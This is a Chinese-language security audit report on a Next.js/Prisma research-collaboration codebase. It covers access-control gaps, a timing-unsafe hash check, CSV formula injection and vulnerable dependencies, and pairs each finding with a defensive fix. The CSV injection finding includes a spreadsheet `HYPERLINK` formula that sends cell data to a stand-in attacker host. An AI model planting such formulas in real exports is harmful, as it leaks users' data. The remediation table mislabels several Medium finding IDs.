# Discovery Commons 資訊安全檢測報告

**報告日期**: 2026-07-03  
**審計版本**: v1.0  
**審計範圍**: `feature/sprint1-visibility-model` branch, commit `047518e`  
**整體安全評分**: **58 / 100** (中低 — 存在 3 個 Critical 等級問題需立即修復)

---

## 目錄

1. [摘要](#1-摘要)
2. [Critical 嚴重問題](#2-critical-嚴重問題)
3. [High 高風險問題](#3-high-高風險問題)
4. [Medium 中風險問題](#4-medium-中風險問題)
5. [Low 低風險問題](#5-low-低風險問題)
6. [依賴套件安全](#6-依賴套件安全)
7. [正面安全設計](#7-正面安全設計)
8. [修復優先順序](#8-修復優先順序)

---

## 1. 摘要

本報告針對 Discovery Commons codebase 進行全面性的資訊安全檢測，涵蓋以下領域：

| 檢測項目 | 檔案數量 | 發現數量 |
|---------|---------|---------|
| 程式碼安全掃描 (SQL injection, XSS 等) | 42 API routes + 全部 source | 17 |
| 依賴套件安全 (npm audit) | 62 dependencies | 9 vulnerabilities |
| Authentication & Authorization | 5 auth-related files | 6 |
| 資料庫安全 (Prisma schema + access control) | schema + 42 routes | 5 |
| SHA-256 seal/reveal 機制 | 6 hash/seal files | 3 |
| API 安全 (validation, rate limiting) | 42 routes | 6 |
| 環境變數和 secrets 管理 | .env, .gitignore, source | 2 |
| CORS / CSP / Security Headers | next.config.mjs, middleware, public-api | 3 |

**嚴重度統計**:

| 等級 | 數量 |
|------|------|
| Critical | 3 |
| High | 5 |
| Medium | 11 |
| Low | 6 |

---

## 2. Critical 嚴重問題

### C-1: SHA-256 hash 比對使用非 constant-time 運算 (Timing Attack)

**嚴重度**: Critical  
**位置**: `src/lib/hash.ts:22`  
**類型**: Cryptographic vulnerability

**問題描述**:

`verifyHash()` 使用 JavaScript `===` operator 進行 hash 比對：

```typescript
// src/lib/hash.ts:22
return computed === hash;
```

`===` 在第一個不匹配的 byte 就會短路返回 false，攻擊者可以透過測量回應時間逐 byte 推測正確的 hash 值（timing attack），從而偽造 seal/reveal 驗證。

**影響範圍**:

- `src/app/api/contributions/[contributionId]/reveal/route.ts:51-55` — reveal 流程的 integrity check
- `src/app/api/contributions/[contributionId]/verify/route.ts:25-30` — contribution hash 驗證
- `src/app/api/sealed/[sealId]/reveal/route.ts:51-52` — sealed registration 的 hash 比對
- `src/app/verify/[hash]/page.tsx:40-46` — 公開的 hash 驗證頁面

**建議修復**:

```typescript
import crypto from "crypto";

export function verifyHash(
  userId: string,
  content: string,
  timestamp: Date,
  hash: string
): boolean {
  const computed = generatePriorityHash(userId, content, timestamp);
  return crypto.timingSafeEqual(
    Buffer.from(computed, "hex"),
    Buffer.from(hash, "hex")
  );
}
```

### C-2: Contribution GET endpoint 完全無 authentication / authorization (Critical IDOR)

**嚴重度**: Critical  
**位置**: `src/app/api/contributions/[contributionId]/route.ts:6-49`  
**類型**: Broken Access Control (CWE-306, CWE-862)

**問題描述**:

GET endpoint 沒有任何 authentication 或 authorization 檢查。任何人（包括未登入的訪客）只要知道 `contributionId`（UUID），就可以讀取：

- Private contributions 的完整內容
- Sealed contributions 的完整內容（繞過 anti-scooping 機制）
- 完整的 version history
- 所有 comments
- Author 資訊

```typescript
// src/app/api/contributions/[contributionId]/route.ts:6-49
export async function GET(request, { params }) {
  try {
    const contribution = await prisma.contribution.findUnique({
      where: { id: params.contributionId },
      include: {
        author: { select: { id, displayName, name, image, trustLevel } },
        thread: { select: { id, title, creatorId } },
        versions: { orderBy: { versionNumber: "desc" } },
        comments: { /* ... */ },
      },
    });
    if (!contribution) return 404;
    return NextResponse.json(contribution); // 無任何存取控制
  }
}
```

**建議修復**:

```typescript
export async function GET(request, { params }) {
  const session = await getSession();
  const contribution = await prisma.contribution.findUnique({
    where: { id: params.contributionId },
    include: {
      thread: { include: { collaborators: true } },
      sharedWith: true,
      // ...rest
    },
  });
  if (!contribution) return 404;

  const access = evaluateContributionAccess(
    {
      authorId: contribution.authorId,
      visibility: contribution.visibility,
      sharedWith: contribution.sharedWith.map(s => s.userId),
      thread: {
        creatorId: contribution.thread.creatorId,
        visibility: contribution.thread.visibility,
        collaboratorIds: contribution.thread.collaborators.map(c => c.userId),
      },
    },
    session?.user?.id ?? null
  );

  if (!access.canView) return 404;
  const result = maskContributionForViewer(contribution, access);
  return NextResponse.json(result);
}
```

### C-3: Contribution verify endpoint 洩漏 sealed content

**嚴重度**: Critical  
**位置**: `src/app/api/contributions/[contributionId]/verify/route.ts:5-45`  
**類型**: Information Disclosure (CWE-200)

**問題描述**:

Hash verify endpoint 是公開的（無 auth 要求），為了計算 `verifyHash()` 而從 database 查詢了 `content` 欄位。雖然 response 不直接回傳 content，但此端點會讀取 sealed contribution 的完整內容到記憶體中，且透過回傳 `verified: true/false` 可以確認特定 contribution 的存在和完整性。

更重要的是，此端點與 C-2 結合時，攻擊者可以：
1. 用 C-2 的 GET endpoint 讀取任何 contribution 的完整內容
2. 用此端點驗證 hash 確認內容真實性

**建議修復**: 對 sealed/private contributions 加入 visibility check，或只允許 contribution author 呼叫此端點。

---

## 3. High 高風險問題

### H-1: Sealed contribution 內容未在 server side 遮罩 (Information Disclosure)

**嚴重度**: High  
**位置**: `src/app/api/threads/[threadId]/route.ts:81-87`  
**類型**: Access control bypass

**問題描述**:

Thread GET endpoint 對 sealed contributions 的處理方式有嚴重缺陷。程式碼註解寫著「content masked client-side」，但 server side 直接回傳完整的 `content` 欄位：

```typescript
// src/app/api/threads/[threadId]/route.ts:84
if (c.visibility === "sealed") return true; // hash + timestamp visible; content masked client-side
```

任何人只要直接呼叫 API（例如用 curl 或 Postman），就可以看到 sealed contribution 的完整內容，完全繞過 anti-scooping 機制。

專案已有 `src/lib/access-control.ts:140-151` 的 `maskContributionForViewer()` helper，但此 route 未使用它。

**建議修復**:

```typescript
const filteredContributions = thread.contributions
  .filter((c) => {
    if (c.authorId === session?.user?.id) return true;
    if (c.visibility === "public") return true;
    if (c.visibility === "sealed") return true;
    if (c.visibility === "shared" && session?.user?.id) return true;
    return false;
  })
  .map((c) => {
    if (c.visibility === "sealed" && c.authorId !== session?.user?.id) {
      return { ...c, content: null };
    }
    return c;
  });
```

### H-2: Replication update 缺少 authorization 檢查 (Broken Access Control)

**嚴重度**: High  
**位置**: `src/app/api/v2/replications/[replicationId]/route.ts:36-41`  
**類型**: Authorization bypass

**問題描述**:

PATCH endpoint 只驗證 replication 存在，但不驗證請求者是否有權修改：

```typescript
// src/app/api/v2/replications/[replicationId]/route.ts:36-41
const existing = await prisma.replication.findUnique({
  where: { id: replicationId },
});
if (!existing) {
  return NextResponse.json({ error: "Replication not found" }, { status: 404 });
}
// 缺少 authorization check — 任何已登入使用者都可修改任何 replication
```

攻擊者只要知道 `replicationId` 就能修改 replication outcome 和 notes，可能破壞 verification badge 的完整性。

**建議修復**:

```typescript
const existing = await prisma.replication.findUnique({
  where: { id: replicationId },
  include: { originalThread: { select: { creatorId: true } } },
});
if (!existing) {
  return NextResponse.json({ error: "Replication not found" }, { status: 404 });
}
if (existing.originalThread.creatorId !== session.user.id) {
  return NextResponse.json({ error: "Forbidden" }, { status: 403 });
}
```

### H-3: Comment API 缺少 thread access 驗證 (Broken Access Control)

**嚴重度**: High  
**位置**: `src/app/api/contributions/[contributionId]/comments/route.ts:62-86`  
**類型**: Authorization bypass

**問題描述**:

POST endpoint 在建立留言時，未驗證使用者是否有權存取該 contribution 所屬的 thread。攻擊者只要知道 private thread 中的 `contributionId`，就可以提交留言。

GET endpoint (`route.ts:6-44`) 同樣沒有驗證 thread access，會洩漏 private/shared thread 下的所有 comments。

**建議修復**:

在 POST 和 GET 中加入 contribution access check：

```typescript
const contribution = await prisma.contribution.findUnique({
  where: { id: params.contributionId },
  include: { thread: { select: { creatorId: true, visibility: true, collaborators: true } } },
});
if (!contribution) {
  return NextResponse.json({ error: "Not found" }, { status: 404 });
}
// 使用 access-control.ts 中的 evaluateContributionAccess() 驗證權限
```

### H-4: CSV export 存在 formula injection 漏洞

**嚴重度**: High  
**位置**:
- `src/app/api/credits/route.ts:29`
- `src/app/api/v2/credits/me/export/route.ts:38`

**類型**: CSV Injection (CWE-1236)

**問題描述**:

CSV export 中的 thread title 只經過 `JSON.stringify()` 處理。如果 title 以 `=`, `+`, `@`, `-` 開頭，在 Excel/Google Sheets 中開啟時會被當作公式執行：

```typescript
// src/app/api/credits/route.ts:29
`${c.timestamp.toISOString()},${JSON.stringify(c.thread.title)},${c.contribution?.type || ""},${c.creditType},${c.hash}`
```

攻擊者可以建立標題為 `=HYPERLINK("http://evil.com?d="&A1,"Click me")` 的 thread，其他使用者 export CSV 後開啟就會觸發。

**建議修復**:

```typescript
function escapeCsvField(field: string): string {
  if (/^[=+@\-\t\r]/.test(field)) {
    return `"'${field.replace(/"/g, '""')}"`;
  }
  return JSON.stringify(field);
}
```

### H-5: Next.js 框架存在多個已知漏洞

**嚴重度**: High  
**位置**: `package.json:19` (`"next": "^14.2.0"`)  
**類型**: Known vulnerabilities in dependencies

**問題描述**:

目前使用的 Next.js 14.2.x 存在 14 個已知漏洞（詳見第 6 節），包括：

- **GHSA-h25m-26qc-wcjf** (High): HTTP request deserialization DoS via React Server Components
- **GHSA-ggv3-7p47-pfv8** (Moderate): HTTP request smuggling in rewrites
- **GHSA-ffhc-5mcf-pf4q** (XSS): CSP nonce bypass in App Router
- **GHSA-c4j6-fc7j-m34r** (Moderate): SSRF via WebSocket upgrades
- 多個 cache poisoning 和 DoS 漏洞

**建議修復**:

升級 Next.js 至 `>=15.5.13` 或 `>=16.2.10` 以修復所有已知漏洞。注意：此為 semver major change，需做相容性測試。

---

## 4. Medium 中風險問題

### M-1: 無 Rate Limiting (DoS / Resource Exhaustion)

**嚴重度**: Medium  
**位置**: 所有 API routes  
**類型**: Denial of Service (CWE-770)

**問題描述**:

除了 AI Reviewer (`src/app/api/v2/threads/[threadId]/ai/review/route.ts:29-35` 有 daily quota) 之外，所有 API routes 均無 rate limiting。攻擊者可以：

- 無限建立 threads/contributions 消耗資料庫空間
- 大量呼叫 seal registration 灌爆 hash 記錄
- 高頻率存取 API 造成服務中斷

README.md 第 156 行已標註此為 known gap。

**建議修復**:

使用 middleware-level rate limiting（如 `@upstash/ratelimit`）或自訂 in-memory rate limiter。

### M-2: Thread PATCH 缺少 input validation

**嚴重度**: Medium  
**位置**: `src/app/api/threads/[threadId]/route.ts:128-132`  
**類型**: Input validation bypass (CWE-20)

**問題描述**:

POST 使用 `createThreadSchema` 驗證輸入（title min 10 chars, description min 20 chars），但 PATCH 完全不驗證：

```typescript
// src/app/api/threads/[threadId]/route.ts:128-132
const updates: any = {};
if (body.title) updates.title = body.title;
if (body.description) updates.description = body.description;
if (body.domainTags) updates.domainTags = body.domainTags;
if (body.isArchived !== undefined) updates.isArchived = body.isArchived;
```

可以將 title 設為空字串、將 domainTags 設為非 array 型別。

**建議修復**: 建立 `updateThreadSchema` 進行驗證。

### M-3: User profile PATCH 缺少 input validation

**嚴重度**: Medium  
**位置**: `src/app/api/users/me/route.ts:53-60`  
**類型**: Input validation bypass (CWE-20)

**問題描述**: 與 M-2 相同模式 — displayName、bio、interests 均無驗證即直接傳入 Prisma。

**建議修復**: 建立 `updateUserSchema` 進行驗證。

### M-4: Thread listing 的 sort/order 參數未做 allowlist 過濾

**嚴重度**: Medium  
**位置**: `src/app/api/threads/route.ts:18-19, 70`  
**類型**: Parameter injection (CWE-20)

**問題描述**:

`sort` 和 `order` query parameters 直接用於 Prisma `orderBy`：

```typescript
// src/app/api/threads/route.ts:18-19
const sort = searchParams.get("sort") || "updatedAt";
const order = searchParams.get("order") || "desc";
// ...
// src/app/api/threads/route.ts:70
orderBy: { [sort]: order },
```

雖然 Prisma 可防止 SQL injection，但攻擊者可以指定任意欄位排序（如 `sort=email` 嘗試推測資訊），或傳入無效值造成 500 error。

**建議修復**:

```typescript
const ALLOWED_SORT_FIELDS = ["createdAt", "updatedAt", "title"];
const ALLOWED_ORDERS = ["asc", "desc"];
if (!ALLOWED_SORT_FIELDS.includes(sort)) { /* 400 error */ }
if (!ALLOWED_ORDERS.includes(order)) { /* 400 error */ }
```

### M-5: Pagination 無上限限制

**嚴重度**: Medium  
**位置**: `src/app/api/threads/route.ts:12-13`  
**類型**: Denial of Service (CWE-770)

**問題描述**:

`per_page` 參數無上限：

```typescript
const page = parseInt(searchParams.get("page") || "1");
const perPage = parseInt(searchParams.get("per_page") || "20");
```

攻擊者可以發送 `?per_page=999999` 造成 database 大量讀取。且 `page` 可以為負數或 0，`parseInt` 結果為 NaN 時會造成 Prisma query 異常。

**建議修復**: `Math.max(1, Math.min(perPage, 100))`，並驗證 `page >= 1`。

### M-6: TOCTOU race condition 在 seal reveal 流程

**嚴重度**: Medium  
**位置**: `src/app/api/sealed/[sealId]/reveal/route.ts:18-31`  
**類型**: Race condition (CWE-367)

**問題描述**:

check-then-act pattern：先在 transaction 外檢查 `status !== "sealed"`，再進入 transaction 更新。兩個同時到達的 request 都可能通過 status check，導致 reveal 被執行兩次。

```typescript
// 在 transaction 外檢查:
if (seal.status !== "sealed") { /* 400 error */ }
// ...數十行之後才進入 transaction:
const result = await prisma.$transaction(async (tx) => { /* update */ });
```

**建議修復**: 將 status check 移到 transaction 內部。

### M-7: Visibility filter query 被 search 覆蓋

**嚴重度**: Medium  
**位置**: `src/app/api/threads/route.ts:50-59`  
**類型**: Authorization bypass (CWE-863)

**問題描述**:

Thread listing 先建立 visibility-based `where.OR` 條件（第 32-47 行），但如果同時帶有 `q` search 參數，`where.OR` 會被覆蓋（第 54-58 行）：

```typescript
// 第 32-47 行: 建立 visibility filtering
where.OR = [
  { visibility: "public" },
  { creatorId: session.user.id },
  // ...
];

// 第 50 行: 如果帶有 visibility 參數，直接覆蓋
if (visibility) where.visibility = visibility;

// 第 54-58 行: 如果帶有 q 參數，覆蓋 OR
if (q) {
  where.OR = [
    { title: { contains: q } },
    { description: { contains: q } },
  ];
}
```

當帶有 `?q=` 時，原本的 visibility-based access control 被完全替換為 title/description search，可能洩漏 private threads。

**建議修復**: 使用 `where.AND` 組合 visibility filter 與 search 條件。

### M-8: Trusted circle 關係方向可能有邏輯問題

**嚴重度**: Medium  
**位置**: `src/app/api/threads/route.ts:39-47`  
**類型**: Authorization logic error (CWE-863)

**問題描述**:

Thread listing 中第四個 OR 條件檢查的是「thread creator 是否將 session user 加入了 trusted circle」：

```typescript
// src/app/api/threads/route.ts:39-47
{
  visibility: "shared",
  creator: {
    trustedByMe: {
      some: { trustedUserId: session.user.id },
    },
  },
},
```

這表示 thread creator 單方面就能讓另一個使用者看到他的 shared threads。被加入者沒有 opt-in 機制。雖然這可能是有意設計（creator 主動邀請），但從隱私角度，應確保此行為符合使用者預期。

**建議修復**: 確認此為有意設計並加入文件說明，或改為 bidirectional trust（雙方都加入彼此的 trusted circle）。

### M-9: researchObjectSchema 使用 z.record(z.unknown()) (過度寬鬆)

**嚴重度**: Medium  
**位置**: `src/lib/validations.ts:81-82`  
**類型**: Input validation bypass (CWE-20)

**問題描述**:

Research Object 的 `structuredContent` 接受任意 JSON object：

```typescript
export const researchObjectSchema = z.object({
  structuredContent: z.record(z.unknown()),
});
```

攻擊者可以寫入巨大的 JSON blob 消耗儲存空間，或寫入含有惡意腳本的 nested content。

**建議修復**: 定義明確的 SDG schema 結構，或至少加上 `z.string().max()` 限制大小。

### M-10: AI Review endpoint 缺少 thread ownership 檢查

**嚴重度**: Medium  
**位置**: `src/app/api/v2/threads/[threadId]/ai/review/route.ts:37-48`  
**類型**: Authorization bypass (CWE-863)

**問題描述**:

任何已登入使用者都可以觸發任意 thread 的 AI review，不需要是 thread creator 或 collaborator。雖然有 quota check，但攻擊者可以消耗別人 thread 的 API tokens，且 AI review 結果會改變 thread 的 `verificationBadge`（第 76-81 行）。

**建議修復**: 加入 thread creator/collaborator 權限檢查。

### M-11: Middleware 保護範圍不完整

**嚴重度**: Medium  
**位置**: `src/middleware.ts:3-4`  
**類型**: Authentication bypass (CWE-306)

**問題描述**:

```typescript
export const config = {
  matcher: ["/threads/new", "/sealed", "/profile", "/admin/:path*", "/notifications", "/settings"],
};
```

Middleware 只保護少數 page routes。所有 API routes (`/api/*`) 不在 matcher 中，各自在 route handler 內做 auth check。如果某個 API route 忘記呼叫 `getSession()`，就是 open access。

已確認：`/api/contributions/[id]/comments` GET endpoint 無 auth check（見 H-3）；`/api/contributions/[id]/verify` 和 `/api/sealed/[id]/verify` 是故意公開的（hash verification）。

**建議修復**: 考慮加入 `/api/:path*` 到 middleware matcher，並用特定 path 例外處理公開 endpoints。

---

## 5. Low 低風險問題

### L-1: 無 Content-Security-Policy header

**嚴重度**: Low  
**位置**: `next.config.mjs`  
**類型**: Missing security header (CWE-693)

**問題描述**:

`next.config.mjs` 未設定任何 security headers（CSP, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security 等）。

**建議修復**: 在 `next.config.mjs` 中加入 `headers()` 設定。

### L-2: Public API CORS 設為 wildcard `*`

**嚴重度**: Low  
**位置**: `src/lib/public-api.ts:7`  
**類型**: Overly permissive CORS (CWE-942)

**問題描述**:

```typescript
"Access-Control-Allow-Origin": "*",
```

對於唯讀的公開 API（L3 public content），wildcard CORS 是合理設計。但如果未來加入 authenticated 的跨來源請求，需要改用明確的 origin allowlist。目前為 Low 因為公開 API 只回傳已公開的資料。

### L-3: console.error 洩漏內部錯誤資訊

**嚴重度**: Low  
**位置**: 所有 API routes（約 50 處 `console.error`）  
**類型**: Information disclosure (CWE-209)

**問題描述**:

所有 API routes 在 catch block 中 `console.error` 完整的 error object。在 production 環境中，error 可能包含 database connection string、SQL query、stack trace 等敏感資訊。雖然 `console.error` 不會直接回傳給 client（client 只看到 generic error message），但這些 log 會出現在 server logs 中，如果 log 系統被攻破，就會暴露內部資訊。

**建議修復**: 使用結構化 logging（如 `pino`），在 production 環境過濾 sensitive fields。

### L-4: Dev credentials provider 的安全邊界

**嚴重度**: Low  
**位置**: `src/lib/auth.ts:58-83`  
**類型**: Development-only risk (CWE-798)

**問題描述**:

CredentialsProvider 允許用任意 email 登入（自動建立帳號），雖有 `useCredentialsDev` guard (`NODE_ENV === "development" && !GOOGLE_CLIENT_ID && !GITHUB_CLIENT_ID`)，但如果 production 忘記設定 OAuth credentials，credentials provider 就會在 production 啟用。

```typescript
const useCredentialsDev =
  process.env.NODE_ENV === "development" &&
  !process.env.GOOGLE_CLIENT_ID &&
  !process.env.GITHUB_CLIENT_ID;
```

**建議修復**: 加入明確的 `ENABLE_DEV_AUTH` flag 而非根據其他環境變數推斷。

### L-5: Hash 未加 salt (Brute-force risk)

**嚴重度**: Low  
**位置**: `src/lib/hash.ts:12-14`  
**類型**: Weak cryptographic design

**問題描述**:

`generateContentHash()` 直接 SHA-256 content 而不加 salt：

```typescript
export function generateContentHash(content: string): string {
  return crypto.createHash("sha256").update(content, "utf-8").digest("hex");
}
```

此函數用於 sealed registration 的 content hash（`src/app/api/sealed/route.ts`），攻擊者如果知道可能的 content（如常見假說），可以預先計算 hash 進行比對。

`generatePriorityHash()` 有加入 userId + timestamp 作為 salt，但 `generateContentHash()` 沒有。

**建議修復**: 加入 server-side secret 作為 HMAC key：

```typescript
export function generateContentHash(content: string): string {
  const secret = process.env.HASH_SECRET || process.env.NEXTAUTH_SECRET!;
  return crypto.createHmac("sha256", secret).update(content, "utf-8").digest("hex");
}
```

### L-6: Anonymous comment 的 author ID 可推測

**嚴重度**: Low  
**位置**: `src/app/api/contributions/[contributionId]/comments/route.ts:47-60`  
**類型**: Information disclosure (CWE-200)

**問題描述**:

Anonymous comments 在 response 中將 author 替換為硬編碼的 `{ id: "anonymous", ... }`，但 database 中仍記錄真實 `authorId`。如果 database 被直接存取（或其他 API 洩漏），匿名性就會被破壞。此外，所有 anonymous comments 共用同一個 `id: "anonymous"`，client 端可據此判斷「這些 anonymous 留言是否來自同一人」（答案是「看不出來」但也可能混淆）。

---

## 6. 依賴套件安全

### npm audit 結果

```
9 vulnerabilities (2 low, 3 moderate, 4 high)
```

| 套件 | 嚴重度 | 漏洞說明 | 修復方式 |
|------|--------|---------|---------|
| `next` (14.2.x) | High | 14 個已知漏洞：DoS, XSS, cache poisoning, SSRF, HTTP smuggling | 升級到 `>=15.5.13` (breaking change) |
| `glob` (10.2.x) | High | Command injection via `-c/--cmd` (GHSA-5j98-mcp5-4vw2) | 升級 `eslint-config-next` 到 `>=16.2.10` |
| `eslint-config-next` (14.2.x) | High | 依賴有漏洞的 glob | 升級到 `>=16.2.10` |
| `@next/eslint-plugin-next` | High | 依賴有漏洞的 glob | 隨 eslint-config-next 升級 |
| `postcss` (<8.5.10) | Moderate | XSS via unescaped `</style>` in CSS stringify (GHSA-qx2v-qp2m-jg93) | 隨 Next.js 升級 |
| `uuid` (<11.1.1) | Moderate | Buffer bounds check missing in v3/v5/v6 (GHSA-w5hq-g745-h8pq) | 升級 `next-auth` 到 v3+ (breaking change) |
| `cookie` (<0.7.0) | Low | Out-of-bounds characters in cookie attributes (GHSA-pxg6-pf52-xh8x) | 隨 next-auth 升級 |
| `@auth/core` (<=0.35.3) | Low | 依賴有漏洞的 cookie | 隨 next-auth 升級 |
| `next-auth` (4.x) | Low | 依賴有漏洞的 @auth/core 和 uuid | 升級到 v5+ (breaking change) |

### 主要 dependencies 版本評估

| 套件 | 目前版本 | 最新穩定版 | 狀態 |
|------|---------|----------|------|
| next | ^14.2.0 | 16.2.10 | 需要升級 |
| next-auth | ^4.24.0 | 5.x | 需要升級（breaking change） |
| @prisma/client | ^6.9.0 | 6.9.x | 最新 |
| zod | ^3.23.0 | 3.x | 最新 |
| react | ^18.3.0 | 19.x | 可選升級 |
| @anthropic-ai/sdk | ^0.39.0 | 0.x | 最新 |

---

## 7. 正面安全設計

以下是 codebase 中做得好的安全設計，值得在後續開發中維持：

### 7.1 認證一致性
- 幾乎所有 non-public API endpoints 都正確呼叫 `getSession()` 並檢查 `session?.user?.id`
- Session 策略根據環境自動切換 JWT (dev) / database (prod)

### 7.2 Prisma ORM 防 SQL injection
- 全部 database query 使用 Prisma ORM，無任何 `$queryRaw` / `$executeRaw` / `$queryRawUnsafe`
- 無字串拼接 SQL 的情況

### 7.3 Input validation (Zod schemas)
- POST endpoints 一致使用 Zod schema 驗證（`createThreadSchema`, `createContributionSchema`, `createCommentSchema` 等）
- Schema 定義合理的 min/max 長度限制

### 7.4 Authorization patterns
- Thread creator ownership check 在多數 mutation endpoints 中正確實作
- Visibility filtering 在 thread listing 中正確實作（public/shared/private）
- `src/lib/access-control.ts` 提供了良好的 access control abstraction，包含 thread-level gate + contribution-level gate

### 7.5 Transaction 使用
- 涉及多表操作的 endpoints 正確使用 `prisma.$transaction()` 確保 ACID
- Credit 建立、seal reveal、visibility changes 都在 transaction 內

### 7.6 安全的錯誤回應
- 大多數 endpoints 回傳 generic error messages（`"An unexpected error occurred"`）
- 使用 `"Not found"` 統一處理「不存在」和「無權限」的情況，避免 IDOR

### 7.7 AI Reviewer quota management
- `src/lib/ai/router.ts:79-97` 實作 per-user daily quota check
- 可透過環境變數調整 quota 上限

### 7.8 環境變數管理
- `.gitignore` 正確排除 `.env`, `.env.local`, `.env.development.local` 等
- 無 `NEXT_PUBLIC_` 前綴的敏感環境變數（API keys, secrets 不會暴露到 client side）
- `.env.example` 不含實際 credentials，只有 placeholder
- Source code 中無 hardcoded secrets

### 7.9 無 XSS 向量
- 未使用 `dangerouslySetInnerHTML` 或 `innerHTML`
- 未使用 `eval()` 或 `Function()` 動態執行程式碼
- React 的 JSX 自動 escape 提供基本 XSS 防護

### 7.10 Visibility lifecycle 設計
- Visibility 只能往上升不能降級（`src/app/api/threads/[threadId]/visibility/route.ts:42-47`）
- `VisibilityLog` 提供完整的 audit trail

---

## 8. 修復優先順序

### 立即修復 (P0 — 本週)

| 編號 | 問題 | 預估工時 |
|------|------|---------|
| C-1 | Hash comparison timing attack → 改用 `crypto.timingSafeEqual()` | 30 min |
| C-2 | Contribution GET endpoint 完全無存取控制 → 加入 auth + visibility check | 1 hr |
| C-3 | Contribution verify endpoint 洩漏 sealed content → 加入 visibility check | 30 min |
| H-1 | Sealed content server-side masking → 使用 `maskContributionForViewer()` | 1 hr |
| M-7 | Thread listing visibility filter 被 search 覆蓋 → 用 `where.AND` | 30 min |

### 短期修復 (P1 — 兩週內)

| 編號 | 問題 | 預估工時 |
|------|------|---------|
| H-2 | Replication authorization check | 30 min |
| H-3 | Comment API access control | 1 hr |
| H-4 | CSV formula injection | 30 min |
| M-2 | Thread PATCH validation | 30 min |
| M-3 | User profile PATCH validation | 30 min |
| M-4 | Sort/order allowlist | 30 min |
| M-5 | Pagination bounds | 15 min |
| M-9 | AI review authorization | 30 min |

### 中期修復 (P2 — 一個月內)

| 編號 | 問題 | 預估工時 |
|------|------|---------|
| H-5 | Next.js 升級 | 4-8 hrs (breaking change) |
| M-1 | Rate limiting framework | 2-4 hrs |
| M-6 | TOCTOU race condition | 1 hr |
| M-8 | Research Object schema validation | 1 hr |
| M-10 | Middleware coverage | 2 hrs |
| L-1 | Security headers (CSP, HSTS 等) | 1 hr |

### 長期改善 (P3 — 下個 release)

| 編號 | 問題 | 預估工時 |
|------|------|---------|
| L-4 | Dev auth explicit flag | 30 min |
| L-5 | Content hash salting (HMAC) | 1 hr |
| 依賴 | next-auth v5 migration | 4-8 hrs |
| 依賴 | eslint-config-next 升級 | 1 hr |

---

## 9. 修復記錄

| 日期 | 修復項目 | 說明 |
|------|---------|------|
| 2026-07-22 | Supabase RLS 啟用 | 對所有 20 張 public schema 表啟用 Row-Level Security（無 policy = 拒絕所有 REST API 存取），並撤銷 `anon` / `authenticated` 角色的直接 table 權限。Prisma（postgres 角色）不受影響。修復 Supabase Security Advisory: `rls_disabled_in_public` + `sensitive_columns_exposed`。SQL 腳本保存於 `src/prisma/rls.sql`。 |

---

> **免責聲明**: 本報告為靜態程式碼審計（static code review），未執行 penetration testing 或動態分析。實際風險可能因部署環境而異。建議定期執行安全審計並設定 CI/CD pipeline 的 dependency scanning（如 `npm audit` 或 Snyk）。
